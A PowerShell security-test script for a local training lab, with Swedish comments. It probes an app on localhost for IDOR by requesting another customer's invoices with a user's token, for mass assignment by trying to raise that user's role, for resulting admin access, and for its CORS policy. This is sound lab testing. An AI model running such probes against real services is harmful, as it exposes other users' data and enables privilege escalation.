# Kraftly Hackerlabb – säkerhetstester
# Kör endast mot din egen lokala labbmiljö.

$BaseUrl = "http://localhost:4000"
$OutputFile = "security-results.txt"

"=== Kraftly Security Test ===" | Out-File $OutputFile
"Datum: $(Get-Date)" | Out-File $OutputFile -Append

# 1. Logga in som Anna
Write-Host "`n[1] Loggar in som Anna..." -ForegroundColor Cyan

try {
    $loginResponse = curl.exe -s -X POST "$BaseUrl/api/login" `
        -H "Content-Type: application/json" `
        -d '{"email":"anna.andersson@example.com","password":"sommar2026"}'

    $login = $loginResponse | ConvertFrom-Json
    $token = $login.token

    if (-not $token) {
        Write-Host "Inloggningen misslyckades:" -ForegroundColor Red
        Write-Host $loginResponse
        exit
    }

    Write-Host "Inloggning lyckades." -ForegroundColor Green
    "Login: lyckades" | Out-File $OutputFile -Append
}
catch {
    Write-Host "Fel vid inloggning: $_" -ForegroundColor Red
    exit
}

# 2. Testa åtkomst till Annas egen profil
Write-Host "`n[2] Testar /api/user..." -ForegroundColor Cyan

$userResult = curl.exe -s -i "$BaseUrl/api/user" `
    -H "Authorization: Bearer $token"

$userResult
"`n=== Profiltest ===`n$userResult" | Out-File $OutputFile -Append

# 3. Testa IDOR – begär Bo:s fakturor med Annas token
Write-Host "`n[3] Testar IDOR – fakturor för annan kund..." -ForegroundColor Cyan

$idorResult = curl.exe -s -i "$BaseUrl/api/invoices?customerNo=K-208811" `
    -H "Authorization: Bearer $token"

$idorResult
"`n=== IDOR-test ===`n$idorResult" | Out-File $OutputFile -Append

# 4. Testa mass assignment – försök ändra rollen
Write-Host "`n[4] Testar om rollen kan ändras..." -ForegroundColor Cyan

$roleResult = curl.exe -s -i -X PUT "$BaseUrl/api/user" `
    -H "Authorization: Bearer $token" `
    -H "Content-Type: application/json" `
    -d '{"role":"support"}'

$roleResult
"`n=== Mass assignment-test ===`n$roleResult" | Out-File $OutputFile -Append

# 5. Logga in igen för att kontrollera om rolländringen påverkar JWT
Write-Host "`n[5] Loggar in igen för kontroll..." -ForegroundColor Cyan

$loginResponse2 = curl.exe -s -X POST "$BaseUrl/api/login" `
    -H "Content-Type: application/json" `
    -d '{"email":"anna.andersson@example.com","password":"sommar2026"}'

$login2 = $loginResponse2 | ConvertFrom-Json
$token2 = $login2.token

if ($token2) {
    $adminResult = curl.exe -s -i "$BaseUrl/api/admin/customers" `
        -H "Authorization: Bearer $token2"

    $adminResult
    "`n=== Admin-åtkomsttest ===`n$adminResult" | Out-File $OutputFile -Append
}
else {
    Write-Host "Kunde inte få en ny token." -ForegroundColor Yellow
}

# 6. Kontrollera CORS – vilken Origin tillåts i svaret?
Write-Host "`n[6] Kontrollerar CORS..." -ForegroundColor Cyan

$corsResult = curl.exe -s -i "$BaseUrl/healthz" `
    -H "Origin: http://127.0.0.1:6666"

$corsResult
"`n=== CORS-test ===`n$corsResult" | Out-File $OutputFile -Append

Write-Host "`nTesterna är klara." -ForegroundColor Green
Write-Host "Resultat sparade i: $OutputFile" -ForegroundColor Green
Write-Host "Kontrollera varje svar innan du beskriver en sårbarhet som bevisad."